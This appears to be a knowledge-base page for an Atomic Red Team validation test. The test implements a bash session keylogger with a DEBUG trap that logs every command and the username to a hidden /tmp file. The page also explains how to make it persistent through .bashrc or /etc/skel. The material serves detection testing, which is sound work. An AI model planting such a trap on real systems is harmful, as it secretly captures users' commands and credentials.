---
atomic_guid: "7f85a946-a0ea-48aa-b6ac-8ff539278258"
title: "Bash session based keylogger"
framework: "atomic"
generated: "true"
attack_technique_id: "T1056.001"
attack_technique_name: "Input Capture: Keylogging"
source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1056.001/T1056.001.yaml"
build_date: "2026-04-26 17:02:12"
executor: "bash"
aliases:
  - "7f85a946-a0ea-48aa-b6ac-8ff539278258"
  - "Bash session based keylogger"
platforms:
  - "linux"
tags:
  - "atomic"
  - "validation-test"
---

[[index|Home]] • [[kb/attack/index|ATT&CK]] • [[kb/tools/index|Tools]] • [[kb/defend/index|D3FEND]] • [[kb/car/index|CAR]] • [[kb/sigma/index|Sigma]] • [[kb/atomic/index|Atomic]] • [[kb/lolbas/index|LOLBAS]] • [[workspaces/index|Notes]]

# Bash session based keylogger

When a command is executed in bash, the BASH_COMMAND variable contains that command. For example :~$ echo $BASH_COMMAND = "echo $BASH_COMMAND". The trap command is not a external command, but a built-in function of bash and can be used in a script to run a bash function when some event occurs. trap will detect when the BASH_COMMAND variable value changes and then pipe that value into a file, creating a bash session based keylogger. 

To gain persistence the command could be added to the users .bashrc or .bash_aliases or the systems default .bashrc in /etc/skel/

## Metadata

- Atomic GUID: 7f85a946-a0ea-48aa-b6ac-8ff539278258
- Technique: T1056.001: Input Capture: Keylogging
- Platforms: linux
- Executor: bash
- Elevation Required: False
- Dependency Executor: sh
- Source Path: atomics/T1056.001/T1056.001.yaml

## ATT&CK Mapping

- [[kb/attack/techniques/T1056-input_capture|T1056.001]]

## Input Arguments

### output_file

- description: File to store captured commands
- type: string
- default: /tmp/.keyboard.log

## Dependencies

This test requires to be run in a bash shell

### Prerequisite Check

```bash
if [ "$(echo $0)" != "bash" ]; then echo -e "\n***** Bash not running! *****\n"; exit 1; fi
```

### Get Prerequisite

```bash
echo ""
```

## Executor

- elevation_required: False
- name: bash

### Command

```bash
trap 'echo "$(date +"%d/%m/%y %H:%M:%S.%s") $USER $BASH_COMMAND" >> #{output_file}' DEBUG
echo "Hello World!"
cat #{output_file}
```

### Cleanup

```bash
rm #{output_file}
```

## Source

- [Source YAML](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1056.001/T1056.001.yaml)
